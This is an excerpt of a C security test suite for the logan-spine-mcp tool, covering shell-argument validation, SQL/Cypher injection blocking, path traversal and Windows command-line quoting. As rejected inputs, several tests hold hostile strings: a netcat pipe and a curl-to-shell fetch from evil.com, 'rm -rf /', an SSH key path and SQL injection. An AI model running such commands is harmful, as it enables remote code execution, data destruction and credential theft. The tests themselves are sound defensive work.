 ...
 *   - Shell injection prevention (lsm_validate_shell_arg)
...
TEST(vendored_integrity_manifest_is_relocatable_and_fail_closed) {
    ...
    while (fgets(line, sizeof(line), checksums)) {
        ...
        ASSERT(strncmp(path, "vendored/", strlen("vendored/")) == 0 ||
               strncmp(path, "internal/lsm/vendored/", strlen("internal/lsm/vendored/")) == 0);
        entries++;
    }
    fclose(checksums);
    ASSERT(entries > 0U);
...
static int security_make_vendored_fixture(char *root, size_t root_size,
    ...
    int n = snprintf(root, root_size, "%s/lsm_vendored_security_XXXXXX", lsm_tmpdir());
    if (n < 0 || (size_t)n >= root_size || !lsm_mkdtemp(root))
        return -1;
...
TEST(shell_rejects_single_quote) {
    ASSERT_FALSE(lsm_validate_shell_arg("foo'bar"));
    PASS();
}

TEST(shell_rejects_dollar_subst) {
    ASSERT_FALSE(lsm_validate_shell_arg("$(whoami)"));
    PASS();
}

TEST(shell_rejects_backtick) {
    ASSERT_FALSE(lsm_validate_shell_arg("`id`"));
    PASS();
}

TEST(shell_rejects_semicolon) {
    ASSERT_FALSE(lsm_validate_shell_arg("foo;rm -rf /"));
    PASS();
}

TEST(shell_rejects_pipe) {
    ASSERT_FALSE(lsm_validate_shell_arg("foo|nc evil.com 4444"));
    PASS();
}

TEST(shell_rejects_ampersand) {
    ASSERT_FALSE(lsm_validate_shell_arg("foo&background"));
    PASS();
}
...
TEST(shell_rejects_backslash) {
    ...
    ASSERT_TRUE(lsm_validate_shell_arg("foo\\bar"));
#else
    ASSERT_FALSE(lsm_validate_shell_arg("foo\\bar"));
#endif
    PASS();
...
TEST(shell_rejects_newline) {
    ASSERT_FALSE(lsm_validate_shell_arg("foo\nbar"));
    PASS();
}
...
TEST(shell_path_arg_rejects_cmd_expansion) {
    ...
    ASSERT_FALSE(lsm_validate_shell_path_arg("foo'bar"));
    ASSERT_FALSE(lsm_validate_shell_path_arg("$(whoami)"));
    ASSERT_FALSE(lsm_validate_shell_path_arg("foo;rm -rf /"));
    ASSERT_FALSE(lsm_validate_shell_path_arg(NULL));
#ifdef _WIN32
    ASSERT_FALSE(lsm_validate_shell_path_arg("C:/repo/%USERPROFILE%"));
    ASSERT_FALSE(lsm_validate_shell_path_arg("C:/repo/!PATH!"));
    ASSERT_FALSE(lsm_validate_shell_path_arg("C:/repo/a^b"));
    ASSERT_TRUE(lsm_validate_shell_path_arg("C:/Users/dev/my repo"));
#else
    ...
    ASSERT_TRUE(lsm_validate_shell_path_arg("/tmp/repo/100%"));
    ASSERT_TRUE(lsm_validate_shell_path_arg("/tmp/my repo"));
#endif
    PASS();
}

TEST(shell_rejects_carriage_return) {
    ASSERT_FALSE(lsm_validate_shell_arg("foo\rbar"));
    PASS();
}

TEST(shell_rejects_null) {
    ASSERT_FALSE(lsm_validate_shell_arg(NULL));
    PASS();
}
...
TEST(shell_rejects_redirect_out) {
    ASSERT_FALSE(lsm_validate_shell_arg("foo>out.txt"));
    PASS();
}

TEST(shell_rejects_redirect_in) {
    ASSERT_FALSE(lsm_validate_shell_arg("foo<in.txt"));
    PASS();
}

TEST(shell_accepts_clean_path) {
    ASSERT_TRUE(lsm_validate_shell_arg("/home/user/.local/bin/logan-spine-mcp"));
    PASS();
}

TEST(shell_accepts_spaces) {
    ASSERT_TRUE(lsm_validate_shell_arg("/Users/John Doe/Documents"));
    PASS();
}

TEST(shell_accepts_dots_dashes) {
    ASSERT_TRUE(lsm_validate_shell_arg("file-name.tar.gz"));
    PASS();
}

TEST(shell_accepts_empty) {
    ASSERT_TRUE(lsm_validate_shell_arg(""));
    PASS();
}
...
TEST(shell_rejects_quote_escape_attack) {
    ...
    ASSERT_FALSE(lsm_validate_shell_arg("' ; rm -rf / ; echo '"));
    PASS();
}

TEST(shell_rejects_command_substitution) {
    ASSERT_FALSE(lsm_validate_shell_arg("$(curl http://evil.com/shell.sh | sh)"));
    PASS();
}

TEST(shell_rejects_env_var_expansion) {
    ASSERT_FALSE(lsm_validate_shell_arg("${HOME}/.ssh/id_rsa"));
    PASS();
}
...
TEST(sqlite_blocks_attach_via_cypher) {
    ...
    int rc = lsm_cypher_execute(s, "MATCH (n) RETURN n", "test", 0, &r);
    /* Valid query works */
    ASSERT_EQ(rc, 0);
...
TEST(sqlite_blocks_attach_direct) {
     ...
     * lsm_store_exec_raw() would be ideal but the store is opaque.
    ...
    lsm_cypher_result_t r = {0};
    int rc = lsm_cypher_execute(s, "ATTACH DATABASE '/tmp/evil.db' AS evil", "test", 0, &r);
...
TEST(sqlite_blocks_detach_direct) {
    ...
    lsm_cypher_result_t r = {0};
    int rc = lsm_cypher_execute(s, "DETACH DATABASE evil", "test", 0, &r);
...
TEST(sqlite_allows_normal_queries) {
    ...
    lsm_cypher_result_t r = {0};
    int rc = lsm_cypher_execute(s, "MATCH (f:Function) WHERE f.name = \"hello\" RETURN f", "test",
                                0, &r);
    ASSERT_EQ(rc, 0);
...
TEST(cypher_rejects_sql_injection_in_string) {
    ...
    if (rc == 0) {
        ...
        int rc2 = lsm_cypher_execute(s, "MATCH (n) RETURN n", "test", 0, &r2);
...
TEST(cypher_rejects_union_injection) {
    ...
    lsm_cypher_result_t r = {0};
    int rc = lsm_cypher_execute(s, "MATCH (n) RETURN n UNION SELECT sql FROM sqlite_master", "test",
                                0, &r);
...
TEST(path_traversal_blocked) {
    ...
    const char *root = "/tmp/lsm_security_test_root";
    mkdir(root, 0755);
...
/* ══════════════════════════════════════════════════════════════════
 *  SHELL-FREE SUBPROCESS EXECUTION (lsm_exec_no_shell)
 *
...
TEST(exec_no_shell_nonexistent_command) {
    const char *argv[] = {"lsm_nonexistent_binary_12345", NULL};
    int rc = lsm_exec_no_shell(argv);
...
/* ──────────────────────────────────────────────────────────────────
 *  WINDOWS COMMAND-LINE QUOTING (lsm_build_cmdline)
 *
 *  Regression guard for #697: lsm_exec_no_shell used _spawnvp, whose
 *  MinGW CRT did not quote arguments containing spaces. The taskkill
 *  filter "IMAGENAME eq logan-spine-mcp.exe" was passed as three
 *  bare tokens, so taskkill printed
 *      ERROR: Invalid argument/option - 'eq'.
 *  on every install. lsm_build_cmdline now performs MSVC-convention
...
/* Assert that lsm_build_cmdline(argv) produces `expected` (wide). */
#define ASSERT_CMDLINE(argv, expected)                                     \
    do {                                                                   \
        wchar_t *_cl = lsm_build_cmdline(argv);                            \
        ASSERT_NOT_NULL(_cl);                                              \
        if (wcscmp(_cl, (expected)) != 0) {                                \
            free(_cl);                                                     \
            FAIL("lsm_build_cmdline produced an unexpected command line"); \
        }                                                                  \
        free(_cl);                                                         \
    } while (0)
...
TEST(cmdline_taskkill_filter_is_single_quoted_token) {
    ...
    const char *argv[] = {"taskkill", "/FI", "IMAGENAME eq logan-spine-mcp.exe", NULL};
    ASSERT_CMDLINE(argv, L"taskkill /FI \"IMAGENAME eq logan-spine-mcp.exe\"");
    PASS();
}
...
TEST(cmdline_single_arg_no_trailing_space) {
    const char *argv[] = {"logan-spine-mcp.exe", NULL};
    ASSERT_CMDLINE(argv, L"logan-spine-mcp.exe");
    PASS();
}
...
TEST(cmdline_null_argv_returns_null) {
    ...
    wchar_t *cl = lsm_build_cmdline(argv);
    ASSERT_NOT_NULL(cl);
...
TEST(cmdline_utf8_multibyte_roundtrips_via_utf8_to_wide) {
     ...
     * line must equal lsm_utf8_to_wide applied to the same fully-quoted
    ...
    wchar_t *expected =
        lsm_utf8_to_wide("echo \"t\xc3\xa4st_\xc3\xbcmlaut \xe4\xb8\x96\xe7\x95\x8c\"");
    wchar_t *actual = lsm_build_cmdline(argv);
    int ok = (expected != NULL && actual != NULL && wcscmp(actual, expected) == 0);
    free(expected);
    free(actual);
    if (!ok) {
        FAIL("multibyte UTF-8 arg did not round-trip through lsm_build_cmdline");
    }
    PASS();
}
...
/* ──────────────────────────────────────────────────────────────────
 *  WINDOWS SHELL-FREE EXECUTION (lsm_exec_no_shell, CreateProcessW path)
 *
 ...
 *  runtime hangs classifying them via NtQueryObject. lsm_popen must
...
TEST(popen_isolated_git_version_round_trip) {
    FILE *fp = lsm_popen("git --version", "r");
    ASSERT_NOT_NULL(fp);
    ASSERT_EQ(lsm_popen_last_was_isolated(), 1);
    char line[256];
    line[0] = '\0';
    ASSERT_NOT_NULL(fgets(line, sizeof(line), fp));
    ASSERT(strncmp(line, "git version", strlen("git version")) == 0);
    ASSERT_EQ(lsm_pclose(fp), 0);
    PASS();
}

TEST(popen_isolated_propagates_exit_code) {
    /* Runs under `cmd.exe /c`, so a bare `exit 7` is the child exit code;
     * lsm_pclose must surface it via GetExitCodeProcess. */
    FILE *fp = lsm_popen("exit 7", "r");
    ASSERT_NOT_NULL(fp);
    ASSERT_EQ(lsm_popen_last_was_isolated(), 1);
    ASSERT_EQ(lsm_pclose(fp), 7);
    PASS();
}
 ...
 * UI HTTP server holds — does NOT cross into the lsm_popen child. Unlike the
